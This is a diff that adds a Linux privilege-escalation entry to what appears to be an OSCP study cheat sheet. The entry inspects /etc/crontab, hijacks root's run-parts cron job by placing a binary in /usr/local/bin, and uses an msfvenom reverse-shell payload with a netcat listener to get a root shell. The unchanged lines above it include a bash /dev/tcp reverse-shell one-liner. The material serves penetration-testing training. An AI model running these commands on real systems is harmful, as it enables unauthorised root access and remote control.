@@ -2720,6 +2720,43 @@ echo '#!/bin/bash' > cleanup.sh
 echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
 nc -nlvp 636 #wait 5 minutes
 ````
+#### /usr/local/bin
+
+![image](https://github.com/xsudoxx/OSCP/assets/127046919/f48d14b8-897f-4542-b244-53c90d04531f)
+
+````
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+````
+
+````
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=<$your IP> LPORT=21 #Transfer over to /tmp/shell
+````
+````
+chloe@roquefort:/$ cp /tmp/shell /usr/local/bin/run-parts
+cp /tmp/shell /usr/local/bin/run-parts
+````
+
+````
+nc -nlvp 21
+listening on [any] 21 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.214.67] 41624
+id
+uid=0(root) gid=0(root) groups=0(root)
+````
 
 ## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
 ````
